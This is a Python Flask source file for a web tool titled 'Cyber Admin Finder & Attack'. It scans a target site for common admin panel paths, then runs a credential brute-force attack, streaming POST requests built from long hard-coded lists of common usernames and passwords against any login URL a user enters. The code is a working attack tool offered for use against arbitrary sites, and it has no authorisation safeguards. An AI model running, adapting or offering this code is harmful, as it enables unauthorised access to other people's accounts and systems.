from flask import Flask, render_template_string, request, Response, stream_with_context
import requests
import itertools
import time

app = Flask(__name__)

# ==================== HTML  (AJAX  ) ====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Admin Finder & Attack</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body { background: #0b0f1a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { max-width: 950px; width: 100%; background: #141b2b; border-radius: 30px; padding: 35px 30px; box-shadow: 0 20px 60px rgba(0,255,200,0.08), 0 0 0 1px #1e2a3f; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 2.4rem; font-weight: 700; background: linear-gradient(135deg, #00f5d4, #0affb0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header .sub { color: #6a7f9e; font-size: 0.95rem; }
        .header .sub span { color: #00f5d4; font-weight: 600; }
        .card { background: #101826; border-radius: 18px; padding: 22px 25px; margin-bottom: 25px; border: 1px solid #1f2d44; }
        .card:hover { border-color: #00f5d466; }
        .card h3 { color: #b0d4ff; font-weight: 500; font-size: 1.2rem; margin-bottom: 15px; }
        .form-group { display: flex; flex-wrap: wrap; gap: 12px; }
        .form-group input { flex: 1 1 200px; padding: 12px 16px; background: #0b111e; border: 1px solid #25344f; border-radius: 12px; color: #d0e4ff; font-size: 0.95rem; outline: none; }
        .form-group input:focus { border-color: #00f5d4; box-shadow: 0 0 0 3px #00f5d422; }
        .form-group button { padding: 12px 28px; background: linear-gradient(135deg, #00c9a7, #00e699); border: none; border-radius: 12px; font-weight: 600; color: #0b0f1a; cursor: pointer; transition: 0.25s; }
        .form-group button:hover { transform: scale(1.02); box-shadow: 0 6px 25px #00f5d466; }
        .result-box { background: #0a101c; border-radius: 16px; padding: 18px 22px; margin-top: 15px; border-left: 4px solid #00f5d4; white-space: pre-wrap; font-family: 'Courier New', monospace; color: #b8d6ff; max-height: 500px; overflow-y: auto; line-height: 1.7; }
        .footer { text-align: center; margin-top: 25px; color: #3e5470; border-top: 1px solid #1a263b; padding-top: 20px; }
        .footer span { color: #00f5d4; }
        .badge { display: inline-block; background: #00f5d422; padding: 4px 14px; border-radius: 30px; color: #00f5d4; font-size: 0.75rem; border: 1px solid #00f5d433; }
        .loading { color: #ffaa44; }
        .success { color: #6affb0; }
        .error { color: #ff7a8a; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1> Cyber Admin Finder & Attack</h1>
        <div class="sub">Developer <span>Arif</span>  v4.0  <span class="badge">#Streaming</span></div>
    </div>

    <!--  :    -->
    <div class="card">
        <h3> .   </h3>
        <form method="POST" action="/find_admin">
            <div class="form-group">
                <input type="text" name="url" placeholder="http://target.com" required>
                <button type="submit"> Scan</button>
            </div>
        </form>
    </div>

    <!--  :   () -->
    <div class="card">
        <h3> .    (BruteForce)  -</h3>
        <form id="bruteforceForm">
            <div class="form-group">
                <input type="text" id="login_url" placeholder="http://target.com/admin/login" required>
                <input type="text" id="username_field" placeholder="  (   )" value="">
                <input type="text" id="password_field" placeholder=" " value="password">
                <button type="submit"> Start Attack</button>
            </div>
        </form>
        <div id="resultContainer" class="result-box" style="display:none;"></div>
    </div>

    <div class="footer">
        <span></span>         <span>Developer Arif</span>
    </div>
</div>

<script>
document.getElementById('bruteforceForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const login_url = document.getElementById('login_url').value;
    const username_field = document.getElementById('username_field').value;
    const password_field = document.getElementById('password_field').value;
    const resultDiv = document.getElementById('resultContainer');
    resultDiv.style.display = 'block';
    resultDiv.innerHTML = '   ...\n';

    try {
        const response = await fetch('/bruteforce_stream', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ login_url, username_field, password_field })
        });
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            const chunk = decoder.decode(value);
            resultDiv.innerHTML += chunk;
            resultDiv.scrollTop = resultDiv.scrollHeight;
        }
    } catch (err) {
        resultDiv.innerHTML += '\n      ';
    }
});
</script>
</body>
</html>
"""

# ====================  ====================

def find_admin_panels(base_url):
    paths = [
        '/admin', '/admin.php', '/admin/login', '/login', '/wp-admin',
        '/administrator', '/panel', '/dashboard', '/admincp', '/cpanel',
        '/user', '/auth', '/backend', '/admin_area', '/controlpanel',
        '/manage', '/siteadmin', '/master'
    ]
    found = []
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'http://' + base_url
    for path in paths:
        try:
            test_url = base_url.rstrip('/') + path
            r = requests.get(test_url, timeout=2.5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 307, 401, 403]:
                found.append(f" {test_url}    Status: {r.status_code}")
        except:
            found.append(f" {path}  Error")
    return found if found else ["     "]

def brute_force_generator(login_url, username_field, password_field):
    if not login_url.startswith(('http://', 'https://')):
        login_url = 'http://' + login_url

    # =====   =====
    passwords = [
        'arif123', 'admin', '123456', 'password', '12345', 'root', 'qwerty', 'abc123',
        '111111', 'letmein', 'pass123', 'welcome', 'admin123', 'password123',
        '123456789', '12345678', '11111111', '123123', 'iloveyou', 'admin@123',
        'Admin@123', 'Pass@123', '1234', 'abcd1234', 'password1', 'qwerty123',
        '123456a', '1q2w3e4r', '1qaz2wsx', 'zaq12wsx', '!@#$%^', 'P@ssw0rd',
        'passw0rd', 'Admin123', 'administrator', 'letmein123', 'qwertyuiop',
        '1234567890', '123456789a', '1234567890a', 'a123456', 'a12345678',
        '1111111111', '222222', '333333', '444444', '555555', '666666',
        '7777777', '88888888', '999999999',
        '000000', '112233', '123321', '654321', '098765', '12345a', 'a12345',
        'qwerty1', '1qazxsw2', '2wsx3edc', '4rfv5tgb', '6yhn7ujm', '8ik,9ol.',
        'adminpass', 'rootpass', 'userpass', 'testpass', 'guestpass',
        'demo123', 'super123', 'web123', 'sys123', 'net123', 'db123',
        'app123', 'server123', 'security123', 'audit123', 'support123',
        'help123', 'info123', 'sales123', 'marketing123', 'hr123',
        'finance123', 'it123', 'dev123', 'qa123', 'tester123',
        'analyst123', 'coordinator123', 'supervisor123', 'director123',
        'consultant123', 'operator123', 'technician123', 'maintainer123',
        'controller123', 'backup123', 'adminuser123', 'sysop123',
        '123456', 'password', '123456789', 'qwerty', '12345', '12345678',
        '111111', '1234567890', '123123', '000000', '555555', '666666',
        '112233', '654321', '123321', '1q2w3e4r', 'qwerty123', 'admin',
        'welcome', 'letmein', 'passw0rd', '!@#$%^&*', 'Aa123456', 'iloveyou',
        'sunshine', 'princess', 'dragon', 'monkey', 'shadow', 'master',
        'hello', 'trustno1', '1234', '1234567', '987654321', 'zxcvbn',
        'qazwsx', '12345a', 'a12345678', 'server', 'database', 'user',
        'root', 'admin123', 'password1', 'pass1234', 'p@ssw0rd', 'Pa$$w0rd',
        'changeme', 'secret', '123456!', 'qwertyuiop', '1qaz2wsx', 'zaq12wsx',
        '123456a', '11111111', '222222', '333333', '444444', '7777777'
    ]

    usernames = [
        'admin', 'root', 'user', 'test', 'guest', 'superuser', 'supervisor',
        'operator', 'manager', 'administrator', 'sysadmin', 'webadmin',
        'networkadmin', 'security', 'auditor', 'support', 'helpdesk',
        'info', 'sales', 'marketing', 'hr', 'finance', 'it', 'dev',
        'developer', 'qa', 'tester', 'analyst', 'coordinator', 'director',
        'consultant', 'engineer', 'technician', 'maintainer', 'controller',
        'backup', 'sysop', 'oracle', 'mysql', 'postgres', 'tomcat',
        'ftp', 'ftpuser', 'pi', 'ubuntu', 'debian', 'kali', 'student',
        'teacher', 'faculty', 'staff', 'agent', 'officer', 'webmaster',
        'master', 'admin1', 'root1', 'user1', 'test1', 'guest1', 'demo',
        'backup', 'adminuser', 'sysop', 'netadmin', 'itmanager', 'techsupport',
        'customerservice', 'billing', 'payroll', 'recruiter', 'trainer',
        'assistant', 'secretary', 'receptionist', 'clerk', 'officer',
        'manager1', 'lead', 'head', 'chief', 'boss', 'ceo', 'cto', 'cfo',
        'coo', 'vp', 'president', 'chairman', 'director1', 'manager2',
        'admin99', 'root99', 'user99', 'test99', 'guest99', 'demo99',
        'super99', 'web99', 'sys99', 'net99', 'db99', 'app99', 'server99',
        'security99', 'audit99', 'support99', 'help99', 'info99', 'sales99',
        'marketing99', 'hr99', 'finance99', 'it99', 'dev99',
        'admin', 'root', 'user', 'test', 'guest', 'superuser', 'supervisor',
        'operator', 'manager', 'administrator', 'sysadmin', 'webadmin',
        'networkadmin', 'security', 'auditor', 'support', 'helpdesk',
        'info', 'sales', 'marketing', 'hr', 'finance', 'it', 'dev',
        'developer', 'qa', 'tester', 'analyst', 'coordinator', 'director',
        'consultant', 'engineer', 'technician', 'maintainer', 'controller',
        'backup', 'sysop', 'oracle', 'mysql', 'postgres', 'tomcat',
        'ftp', 'ftpuser', 'pi', 'ubuntu', 'debian', 'kali', 'student',
        'teacher', 'faculty', 'staff', 'agent', 'officer', 'webmaster',
        'master', 'admin1', 'root1', 'user1', 'test1', 'guest1', 'demo'
    ]

    #  
    usernames = list(set(usernames))
    passwords = list(set(passwords))

    yield "  : {}, : {}  {} \n".format(len(usernames), len(passwords), len(usernames)*len(passwords))
    yield "  ...\n\n"

    found = False
    total = len(usernames) * len(passwords)
    count = 0

    if not username_field.strip():
        #   
        for passw in passwords:
            count += 1
            yield f"[{count}/{total}]  : (: {passw})\n"
            try:
                data = {password_field: passw}
                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                if r.status_code == 302 or (r.status_code == 200 and any(w in r.text.lower() for w in ['dashboard', 'welcome', 'panel'])):
                    yield f"\n **!** : {passw}\n"
                    found = True
                    break
            except:
                yield f"  (: {passw})\n"
            time.sleep(0.2)  #  ,    
    else:
        #  +  
        for user, passw in itertools.product(usernames, passwords):
            count += 1
            yield f"[{count}/{total}]  : {user} : {passw}\n"
            try:
                data = {username_field: user, password_field: passw}
                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                if r.status_code == 302 or (r.status_code == 200 and any(w in r.text.lower() for w in ['dashboard', 'welcome', 'panel'])):
                    yield f"\n **!** : {user} | : {passw}\n"
                    found = True
                    break
            except:
                yield f"  ({user}:{passw})\n"
            time.sleep(0.15)
        #  
    if not found:
        yield "\n    "
    else:
        yield "\n  "

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/find_admin', methods=['POST'])
def find_admin():
    url = request.form.get('url', '').strip()
    if not url:
        return render_template_string(HTML_TEMPLATE)
    res = find_admin_panels(url)
    return render_template_string(HTML_TEMPLATE, result="\n".join(res))

@app.route('/bruteforce_stream', methods=['POST'])
def bruteforce_stream():
    data = request.get_json()
    login_url = data.get('login_url', '').strip()
    username_field = data.get('username_field', '').strip()
    password_field = data.get('password_field', 'password').strip()
    if not login_url:
        return Response("  URL ", mimetype='text/plain')
    return Response(stream_with_context(brute_force_generator(login_url, username_field, password_field)),
                    mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)